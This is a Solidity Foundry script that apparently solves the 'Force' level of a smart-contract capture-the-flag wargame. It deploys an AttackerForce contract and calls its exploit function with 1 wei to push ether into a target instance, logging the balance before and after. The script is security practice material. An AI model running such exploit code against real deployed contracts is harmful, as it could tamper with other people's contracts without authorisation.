// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "contracts/07_Force.sol";

contract AttackerForceScript is Script {
    function run() external {
        address force = vm.envAddress("INSTANCE");

        vm.startBroadcast();

        AttackerForce attackerForce = new AttackerForce();

        console.log("Initial balance ", force.balance);
        attackerForce.exploit{value: 1 wei}(force);
        console.log("Final balance ", force.balance);

        vm.stopBroadcast();
    }
}
